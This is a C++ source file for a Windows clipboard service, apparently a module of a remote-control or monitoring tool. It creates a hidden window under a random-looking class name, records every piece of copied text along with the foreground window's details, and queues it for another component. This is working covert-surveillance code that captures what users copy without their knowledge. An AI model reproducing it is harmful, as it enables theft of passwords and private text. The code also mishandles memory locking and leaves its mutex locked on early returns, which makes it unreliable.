#include "services.hpp"

#if SERVICE_CLIPBOARD_ENABLED

#include "log.hpp"
#include "winfx.hpp"
#include "tools.hpp"
#include "lrcdatatypes.hpp"

#include <string>
#include <sstream>
#include <queue>

#include <thread>
#include <atomic>
#include <mutex>

using namespace Services;

namespace
{
	using namespace std;

	atomic_bool isRunning = false;
	mutex stateMutex;

	wstring cbdClassName;
	HWND hwndClipboard;

	void SaveClipboard()
	{
		BOOL isOpened = OpenClipboard(NULL);

		if (isOpened == FALSE)
		{
			return;
		}

		BOOL isUnicode = IsClipboardFormatAvailable(CF_UNICODETEXT);

		if (isUnicode == FALSE)
		{
			CloseClipboard();
			return;
		}

		HANDLE hData = GetClipboardData(CF_UNICODETEXT);

		if (hData == NULL)
		{
			CloseClipboard();
			return;
		}

		WCHAR* wCbrd = static_cast<WCHAR *>(GlobalLock(hData));
		GlobalUnlock(hData);

		CloseClipboard();

		LRCData::Clipboard cbd;
		cbd.wndInfo = tools::GetWNDInfo(GetForegroundWindow());
		cbd.data = std::wstring(wCbrd);
		
		stringstream logMessage;
		logMessage << "[Clipboard] Copied " << cbd.data.size() << " characters.";
		Log::Info(logMessage.str());

		ClipboardWorker::Add(cbd);
	}

	LRESULT CALLBACK CbdWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
	{
		if (msg == WM_CLIPBOARDUPDATE)
		{
			SaveClipboard();
		}

		return DefWindowProc(hwnd, msg, wParam, lParam);
	}

	bool CreateClipboardListener()
	{
		cbdClassName = L"6hmHDoEaA4dpHmxS";

		// Registering the Window Class
		WNDCLASSEXW wc;

		wc.cbSize = sizeof(WNDCLASSEXW);
		wc.style = NULL;
		wc.lpfnWndProc = CbdWndProc;
		wc.cbClsExtra = NULL;
		wc.cbWndExtra = NULL;
		wc.hInstance = NULL;
		wc.hIcon = NULL;
		wc.hCursor = NULL;
		wc.hbrBackground = NULL;
		wc.lpszMenuName = NULL;
		wc.lpszClassName = cbdClassName.c_str();
		wc.hIconSm = NULL;

		ATOM cbdClassAtom = RegisterClassExW(&wc);

		if (cbdClassAtom == NULL)
		{
			return false;
		}

		// Creating the Window
		hwndClipboard = CreateWindowExW(
			NULL,
			cbdClassName.c_str(),
			cbdClassName.c_str(),
			WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT, CW_USEDEFAULT, 100, 100,
			HWND_MESSAGE, NULL, NULL, NULL);

		if (hwndClipboard == NULL)
		{
			UnregisterClassW(cbdClassName.c_str(), NULL);
			return false;
		}

		ShowWindow(hwndClipboard, SW_HIDE);
		UpdateWindow(hwndClipboard);

		// Adding clipboard listener
		BOOL res = AddClipboardFormatListener(hwndClipboard);

		if (res == FALSE)
		{
			DestroyWindow(hwndClipboard);
			UnregisterClassW(cbdClassName.c_str(), NULL);
			return false;
		}

		return true;
	}

	void DestroyClipboardListener()
	{
		if (cbdClassName.length() == 0)
		{
			return;
		}

		RemoveClipboardFormatListener(hwndClipboard);
		DestroyWindow(hwndClipboard);
		UnregisterClassW(cbdClassName.c_str(), NULL);
		cbdClassName.clear();
	}
}

void ClipboardSvc::Run()
{
	stateMutex.lock();

	if (isRunning.load())
	{
		return;
	}

	isRunning.store(true);

	bool success = CreateClipboardListener();

	if (!success)
	{
		isRunning.store(false);
	}

	stateMutex.unlock();
}

void ClipboardSvc::Stop()
{
	stateMutex.lock();

	if (!isRunning.load())
	{
		return;
	}

	isRunning.store(false);

	DestroyClipboardListener();

	stateMutex.unlock();
}

bool ClipboardSvc::IsRunning()
{
	return isRunning.load();
}

#endif